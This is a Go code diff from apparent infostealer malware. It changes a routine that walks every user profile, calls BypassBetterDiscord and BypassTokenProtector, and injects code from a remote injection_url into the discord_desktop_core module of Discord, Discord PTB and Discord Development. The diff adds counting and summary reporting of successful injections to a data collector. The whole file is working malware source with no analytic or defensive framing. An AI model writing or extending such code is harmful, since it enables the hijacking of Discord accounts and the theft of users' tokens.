@@ -20,6 +20,9 @@ import (
 )
 
 func Run(injection_url string, dataCollector *collector.DataCollector) {
+	injectionCount := 0
+	var injectionResults []map[string]interface{}
+	
 	for _, user := range hardware.GetUsers() {
 		BypassBetterDiscord(user)
 		BypassTokenProtector(user)
@@ -29,12 +32,25 @@ func Run(injection_url string, dataCollector *collector.DataCollector) {
 			filepath.Join(user, "AppData", "Local", "discordptb"),
 			filepath.Join(user, "AppData", "Local", "discorddevelopment"),
 		} {
-			InjectDiscord(dir, injection_url, dataCollector)
+			InjectDiscord(dir, injection_url, dataCollector, &injectionCount, &injectionResults)
 		}
+	}
+
+	// Add summary of injections
+	if injectionCount > 0 {
+		summaryData := map[string]interface{}{
+			"TotalInjectionsCompleted": injectionCount,
+			"InjectionDetails":         injectionResults,
+		}
+		dataCollector.AddData("discord_injection", summaryData)
+	} else {
+		dataCollector.AddData("discord_injection", map[string]interface{}{
+			"Status": "No Discord installations found for injection",
+		})
 	}
 }
 
-func InjectDiscord(dir string, injection_url string, dataCollector *collector.DataCollector) error {
+func InjectDiscord(dir string, injection_url string, dataCollector *collector.DataCollector, injectionCount *int, injectionResults *[]map[string]interface{}) error {
 	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
 	if err != nil {
 		return err
@@ -70,12 +86,13 @@ func InjectDiscord(dir string, injection_url string, dataCollector *collector.Da
 		return err
 	}
 
-	// Log injection success
+	// Log injection success  
+	*injectionCount++
 	injectionInfo := map[string]interface{}{
 		"Status":     "Discord injection completed",
 		"TargetPath": core,
 	}
-	dataCollector.AddData("discord_injection", injectionInfo)
+	*injectionResults = append(*injectionResults, injectionInfo)
 
 	return nil
 }
